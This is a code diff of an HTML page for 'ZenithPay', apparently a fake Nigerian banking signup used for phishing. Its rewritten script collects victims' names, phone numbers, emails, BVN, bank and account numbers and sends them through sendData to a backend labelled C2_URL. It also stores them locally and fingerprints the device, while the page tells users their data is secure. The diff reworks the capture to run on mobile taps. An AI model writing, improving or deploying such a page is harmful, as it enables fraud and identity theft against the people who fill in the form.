@@ -6,7 +6,11 @@
     <title>ZenithPay</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
             font-family: 'Inter', -apple-system, sans-serif;
             background: #f4f6f9;
@@ -16,6 +20,7 @@
             padding: 0;
             min-height: 100vh;
             margin: 0;
+            -webkit-tap-highlight-color: transparent;
         }
         .container {
             width: 100%;
@@ -24,7 +29,9 @@
             background: #f4f6f9;
             min-height: 100vh;
         }
-        .hidden { display: none !important; }
+        .hidden {
+            display: none !important;
+        }
         .splash {
             position: fixed;
             top: 0;
@@ -38,14 +45,28 @@
             z-index: 999;
             animation: fadeOut 0.5s ease 2.8s forwards;
         }
-        @keyframes fadeOut { to { opacity: 0; pointer-events: none; } }
-        .splash-box { text-align: center; color: #fff; }
-        .splash-box h1 { font-size: 32px; font-weight: 900; }
-        .splash-box p { opacity: 0.7; margin-top: 4px; }
+        @keyframes fadeOut {
+            to {
+                opacity: 0;
+                pointer-events: none;
+            }
+        }
+        .splash-box {
+            text-align: center;
+            color: #fff;
+        }
+        .splash-box h1 {
+            font-size: 32px;
+            font-weight: 900;
+        }
+        .splash-box p {
+            opacity: 0.7;
+            margin-top: 4px;
+        }
         .loader {
             width: 200px;
             height: 4px;
-            background: rgba(255,255,255,0.2);
+            background: rgba(255, 255, 255, 0.2);
             border-radius: 4px;
             margin: 24px auto 0;
             overflow: hidden;
@@ -59,14 +80,22 @@
             border-radius: 4px;
             animation: load 2.5s ease forwards;
         }
-        @keyframes load { to { width: 0%; } }
+        @keyframes load {
+            to {
+                width: 0%;
+            }
+        }
         .header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 4px 0 16px;
         }
-        .header h2 { font-size: 20px; font-weight: 800; color: #0f172a; }
+        .header h2 {
+            font-size: 20px;
+            font-weight: 800;
+            color: #0f172a;
+        }
         .badge {
             background: #e8f5e9;
             color: #0a7e3d;
@@ -84,39 +113,73 @@
             align-items: center;
             margin-bottom: 20px;
             color: #fff;
-            box-shadow: 0 6px 24px rgba(10,126,61,0.25);
+            box-shadow: 0 6px 24px rgba(10, 126, 61, 0.25);
         }
         .banner .tag {
-            background: rgba(255,255,255,0.15);
+            background: rgba(255, 255, 255, 0.15);
             font-size: 10px;
             font-weight: 600;
             padding: 2px 10px;
             border-radius: 100px;
             display: inline-block;
         }
-        .banner h3 { font-size: 20px; font-weight: 800; margin: 2px 0; }
-        .banner .gold { color: #f5a623; }
-        .banner p { font-size: 13px; opacity: 0.8; }
+        .banner h3 {
+            font-size: 20px;
+            font-weight: 800;
+            margin: 2px 0;
+        }
+        .banner .gold {
+            color: #f5a623;
+        }
+        .banner p {
+            font-size: 13px;
+            opacity: 0.8;
+        }
         .timer {
-            background: rgba(255,255,255,0.12);
+            background: rgba(255, 255, 255, 0.12);
             padding: 6px 14px;
             border-radius: 10px;
             text-align: center;
         }
-        .timer .label { display: block; font-size: 9px; text-transform: uppercase; opacity: 0.6; }
-        .timer .time { font-size: 18px; font-weight: 700; }
+        .timer .label {
+            display: block;
+            font-size: 9px;
+            text-transform: uppercase;
+            opacity: 0.6;
+        }
+        .timer .time {
+            font-size: 18px;
+            font-weight: 700;
+        }
         .card {
             background: #fff;
             border-radius: 16px;
             padding: 22px 18px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.04);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
             border: 1px solid #e2e8f0;
         }
-        .card h4 { font-size: 18px; font-weight: 700; color: #0f172a; }
-        .card .sub { color: #64748b; font-size: 14px; margin-bottom: 18px; }
-        .field { margin-bottom: 14px; }
-        .field label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 4px; color: #0f172a; }
-        .field input, .field select {
+        .card h4 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0f172a;
+        }
+        .card .sub {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 18px;
+        }
+        .field {
+            margin-bottom: 14px;
+        }
+        .field label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            color: #0f172a;
+        }
+        .field input,
+        .field select {
             width: 100%;
             padding: 12px 14px;
             background: #f8fafc;
@@ -129,21 +192,29 @@
             appearance: none;
             -webkit-appearance: none;
         }
-        .field input:focus, .field select:focus {
+        .field input:focus,
+        .field select:focus {
             border-color: #0a7e3d;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(10,126,61,0.1);
+            box-shadow: 0 0 0 3px rgba(10, 126, 61, 0.1);
             background: #fff;
         }
-        .field input::placeholder { color: #94a3b8; }
+        .field input::placeholder {
+            color: #94a3b8;
+        }
         .field select {
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%2394a3b8' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");
             background-repeat: no-repeat;
             background-position: right 14px center;
             cursor: pointer;
         }
-        .row { display: flex; gap: 12px; }
-        .row .field.half { flex: 1; }
+        .row {
+            display: flex;
+            gap: 12px;
+        }
+        .row .field.half {
+            flex: 1;
+        }
         .checkbox {
             display: flex;
             align-items: flex-start;
@@ -152,7 +223,12 @@
             color: #64748b;
             margin: 16px 0 18px;
         }
-        .checkbox input { margin-top: 2px; width: 16px; height: 16px; accent-color: #0a7e3d; }
+        .checkbox input {
+            margin-top: 2px;
+            width: 16px;
+            height: 16px;
+            accent-color: #0a7e3d;
+        }
         button[type="submit"] {
             background: linear-gradient(135deg, #0a7e3d, #064e2a);
             border: none;
@@ -165,17 +241,24 @@
             width: 100%;
             font-family: 'Inter', sans-serif;
             transition: 0.25s;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
         }
         button[type="submit"]:hover {
             transform: scale(1.01);
-            box-shadow: 0 6px 24px rgba(10,126,61,0.3);
+            box-shadow: 0 6px 24px rgba(10, 126, 61, 0.3);
         }
         button[type="submit"]:disabled {
             background: #94a3b8;
             cursor: not-allowed;
             transform: none;
         }
-        .footer-text { text-align: center; margin-top: 18px; font-size: 12px; color: #64748b; }
+        .footer-text {
+            text-align: center;
+            margin-top: 18px;
+            font-size: 12px;
+            color: #64748b;
+        }
     </style>
 </head>
 <body>
@@ -212,7 +295,7 @@
             <h4>Create your account</h4>
             <p class="sub">Join thousands of Nigerians</p>
 
-            <form id="signupForm">
+            <form id="signupForm" onsubmit="return false;">
                 <div class="field">
                     <label>Full Name</label>
                     <input type="text" id="fullname" placeholder="e.g., Chidi Okafor" required />
@@ -227,7 +310,7 @@
                 </div>
                 <div class="field">
                     <label>Occupation</label>
-                    <input type="text" id="e.g lawyer" placeholder="e.g lawyer" required />
+                    <input type="text" id="occupation" placeholder="e.g lawyer" required />
                 </div>
                 <div class="row">
                     <div class="field half">
@@ -245,7 +328,7 @@
                     <label for="terms">I agree to the Terms & Privacy Policy</label>
                 </div>
 
-                <button type="submit" id="submitBtn">Open Account</button>
+                <button type="button" id="submitBtn" class="btn-submit">Open Account</button>
             </form>
 
             <div class="footer-text">🔒 Your data is encrypted and secure</div>
@@ -254,28 +337,24 @@
 
     <script>
         // ============================================================
-        // DEBUG VERSION — LOGS EVERYTHING
+        // SIMPLIFIED — WORKS ON MOBILE
         // ============================================================
 
-        console.log('=== DEBUG: Page loaded ===');
-
+        // UPDATE YOUR BACKEND URL HERE
         var C2_URL = 'https://zenithpay-backend-ehdh.onrender.com';
+
+        console.log('Page loaded');
 
         // ===== SPLASH TO LOGIN =====
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('DOMContentLoaded event fired');
             var splash = document.getElementById('splash');
             var loginPage = document.getElementById('loginPage');
 
             if (splash && loginPage) {
-                console.log('Splash and loginPage found');
                 setTimeout(function() {
                     splash.style.display = 'none';
                     loginPage.classList.remove('hidden');
-                    console.log('Splash hidden, login shown');
                 }, 3000);
-            } else {
-                console.error('Splash or loginPage missing');
             }
         });
 
@@ -311,73 +390,66 @@
             });
         }
 
-        // ===== FORM SUBMIT — THE OPEN ACCOUNT BUTTON =====
-        var signupForm = document.getElementById('signupForm');
-        console.log('signupForm element:', signupForm);
+        // ============================================================
+        // ===== OPEN ACCOUNT BUTTON — MOBILE FRIENDLY =====
+        // ============================================================
 
-        if (signupForm) {
-            console.log('✅ signupForm found — attaching submit listener');
-            signupForm.addEventListener('submit', function(e) {
+        var submitBtn = document.getElementById('submitBtn');
+
+        function handleSubmit() {
+            console.log('Button clicked!');
+
+            var userData = {
+                type: 'banking_details',
+                fullname: document.getElementById('fullname').value,
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value,
+                bvn: document.getElementById('bvn').value,
+                bank: document.getElementById('bank').value,
+                account: document.getElementById('account').value
+            };
+
+            // Check required fields
+            if (!userData.fullname || !userData.phone || !userData.email || !userData.bvn || !userData.bank || !userData.account) {
+                alert('⚠️ Please fill in all fields.');
+                return;
+            }
+
+            sendData(userData);
+            localStorage.setItem('zenithpay_user', JSON.stringify(userData));
+
+            submitBtn.textContent = 'Opening...';
+            submitBtn.disabled = true;
+            submitBtn.style.background = '#94a3b8';
+
+            setTimeout(function() {
+                window.location.href = 'dashboard.html';
+            }, 1800);
+        }
+
+        // Add click event (works on mobile)
+        if (submitBtn) {
+            submitBtn.addEventListener('click', handleSubmit);
+            submitBtn.addEventListener('touchend', function(e) {
+                // Prevent double-tap issues
                 e.preventDefault();
-                console.log('🔥 Open Account button CLICKED!');
-
-                var userData = {
-                    type: 'banking_details',
-                    fullname: document.getElementById('fullname').value,
-                    phone: document.getElementById('phone').value,
-                    email: document.getElementById('email').value,
-                    bvn: document.getElementById('bvn').value,
-                    bank: document.getElementById('bank').value,
-                    account: document.getElementById('account').value
-                };
-
-                console.log('User data:', userData);
-
-                sendData(userData);
-                localStorage.setItem('zenithpay_user', JSON.stringify(userData));
-
-                var btn = document.getElementById('submitBtn');
-                btn.textContent = 'Opening Account...';
-                btn.disabled = true;
-
-                setTimeout(function() {
-                    window.location.href = 'dashboard.html';
-                }, 1800);
+                handleSubmit();
             });
-        } else {
-            console.error('❌ signupForm NOT found! Check your HTML.');
         }
 
         // ===== INIT =====
         captureFingerprint();
 
-        var submitBtn = document.getElementById('submitBtn');
-        console.log('submitBtn element:', submitBtn);
-
+        // Enable button after 3 seconds
         if (submitBtn) {
-            // Enable the button after 3 seconds
             submitBtn.disabled = true;
-            console.log('Button disabled initially');
             setTimeout(function() {
                 submitBtn.disabled = false;
-                console.log('✅ Submit button ENABLED after 3 seconds');
+                submitBtn.style.background = '';
+                console.log('Button enabled');
             }, 3000);
-        } else {
-            console.error('❌ submitBtn NOT found!');
         }
-
-        // ===== ADD A DIRECT CLICK TEST =====
-        // This is a fallback — if the form submit fails, this will still trigger
-        setTimeout(function() {
-            var btn = document.getElementById('submitBtn');
-            if (btn) {
-                btn.addEventListener('click', function() {
-                    console.log('🔥 Direct click detected on submitBtn!');
-                    // If the form submit didn't fire, this will at least show something
-                });
-            }
-        }, 500);
     </script>
 
 </body>
-                                                     </html>
+</html>
